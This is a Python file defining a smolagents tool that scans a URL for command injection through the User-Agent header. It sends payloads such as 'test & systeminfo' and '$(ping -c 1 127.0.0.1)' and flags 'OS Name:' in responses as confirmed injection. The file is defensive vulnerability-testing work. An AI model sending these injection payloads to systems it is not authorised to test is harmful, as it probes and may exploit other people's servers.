#!/usr/bin/env python
# coding=utf-8

from smolagents import tool
import requests
import time
import random

@tool
def check_command_injection_via_useragent(url: str) -> str:
    """
    A tool to check if a website is potentially vulnerable to command injection attacks via User-Agent header.
    
    This tool sends requests with specially crafted User-Agent headers containing command injection payloads.
    It then analyzes the responses to detect potential vulnerabilities.
    
    Args:
        url: The complete URL to test (e.g., "https://example.com")
    """
    # Some common command injection payloads for testing
    test_payloads = [
        # Confirmed working payload (real-world example)
        'test & systeminfo',
        '|| ping -c 1 127.0.0.1 ||',
        '; ping -c 1 127.0.0.1 ;',
        '`ping -c 1 127.0.0.1`',
        '| ping -c 1 127.0.0.1 |',
        '$(ping -c 1 127.0.0.1)',
        '& ping -c 1 127.0.0.1 &',
        '&& ping -c 1 127.0.0.1 &&',
        "'; ping -c 1 127.0.0.1 ;'",
        '" ping -c 1 127.0.0.1 "',
    ]
    
    results = []
    normal_response = None
    
    try:
        # First, perform a baseline request with normal User-Agent
        normal_user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
        headers = {'User-Agent': normal_user_agent}
        
        normal_response = requests.get(url, headers=headers, timeout=10)
        normal_status = normal_response.status_code
        normal_content_length = len(normal_response.content)
        normal_response_time = 0
        
        results.append(f"Baseline (normal) request status code: {normal_status}")
        results.append(f"Baseline content length: {normal_content_length} bytes")
        
        # Check if normal response already contains "OS Name:" which would be unexpected
        contains_os_name = "OS Name:" in normal_response.text
        if contains_os_name:
            results.append("WARNING: Baseline response already contains 'OS Name:' text, which is unusual and may affect detection")
        
        # Test with different command injection payloads in User-Agent
        for payload in test_payloads:
            # Add a small delay between requests to avoid overwhelming the server
            time.sleep(random.uniform(0.5, 1.5))
            
            start_time = time.time()
            headers = {'User-Agent': payload}
            
            response = requests.get(url, headers=headers, timeout=15)
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # Analyze the response
            status_diff = response.status_code != normal_status
            content_length_diff = abs(len(response.content) - normal_content_length)
            time_diff = response_time - normal_response_time
            
            # Check specifically for OS Name: in response (strong indicator of command injection)
            os_name_found = "OS Name:" in response.text and not contains_os_name
            
            result = f"\nPayload: {payload}"
            result += f"\n  Status Code: {response.status_code}"
            result += f"\n  Response Size: {len(response.content)} bytes"
            result += f"\n  Response Time: {response_time:.2f} seconds"
            
            # Check for signs of potential vulnerability
            flags = []
            if os_name_found:
                flags.append("CRITICAL: 'OS Name:' found in response - Strong evidence of command injection!")
            if status_diff:
                flags.append("Different status code")
            if content_length_diff > 500:  # Threshold for significant content difference
                flags.append(f"Content length differs by {content_length_diff} bytes")
            if time_diff > 2:  # Threshold for significant time difference
                flags.append(f"Response time increased by {time_diff:.2f} seconds")
            if "error" in response.text.lower() or "exception" in response.text.lower():
                flags.append("Error/Exception in response")
                
            if flags:
                result += f"\n  Potential issues detected: {', '.join(flags)}"
            else:
                result += f"\n  No obvious signs of injection vulnerability"
                
            results.append(result)
        
        analysis = "\n".join(results)
        conclusion = "\n\nConclusion: "
        
        # Look for OS Name: in any responses as primary evidence of vulnerability
        os_name_evidence = any("OS Name:" in r for r in results if "CRITICAL: 'OS Name:' found" in r)
        other_evidence = any("Potential issues detected" in r for r in results) and not os_name_evidence
        
        if os_name_evidence:
            conclusion += "CONFIRMED COMMAND INJECTION VULNERABILITY DETECTED! The server executed the 'systeminfo' command."
            conclusion += "\nThis is a critical security issue that should be addressed immediately."
        elif other_evidence:
            conclusion += "Potential command injection vulnerability detected! Further manual investigation is recommended."
            conclusion += "\nNote: This is only a preliminary test and may produce false positives."
        else:
            conclusion += "No obvious signs of command injection vulnerability were detected."
            conclusion += "\nNote: This doesn't guarantee that the site is secure. More thorough testing is recommended."
        
        return analysis + conclusion
        
    except Exception as e:
        return f"Error while testing for command injection: {str(e)}"